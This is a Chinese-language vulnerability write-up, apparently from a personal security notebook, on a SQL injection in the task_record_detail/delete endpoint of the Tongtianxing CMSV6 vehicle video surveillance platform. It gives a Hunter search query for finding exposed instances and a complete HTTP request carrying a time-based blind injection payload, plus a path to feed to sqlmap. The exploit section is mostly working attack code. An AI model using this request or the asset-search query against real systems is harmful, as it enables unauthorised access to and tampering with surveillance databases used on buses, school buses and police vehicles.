# 通天星CMSV6车载视频监控平台 task_record_detail/delete存在SQL注入漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台task_record_detail/delete存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/lOUel4FBxVvzVwmN/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-677661.png)

# 四、漏洞复现
```java
GET /task_record_detail/delete;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(5)))tdpw)--+  HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=58586A7CBD64C381945F9AAACFDF7C40
Connection: close
Content-Length: 0
```

![1712850651277-f7c97be6-37ce-4294-a3de-578d5aa2ea1d.png](./img/lOUel4FBxVvzVwmN/1712850651277-f7c97be6-37ce-4294-a3de-578d5aa2ea1d-177606.png)

sqlmap

```java
/task_record_detail/delete;downloadLogger.action?ids=1)
```

![1712850782609-4e5c9d7e-83f7-424a-a2c9-6b4e13128715.png](./img/lOUel4FBxVvzVwmN/1712850782609-4e5c9d7e-83f7-424a-a2c9-6b4e13128715-805008.png)



> 更新: 2024-12-28 13:05:34  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cnd2xobo2ctwtife>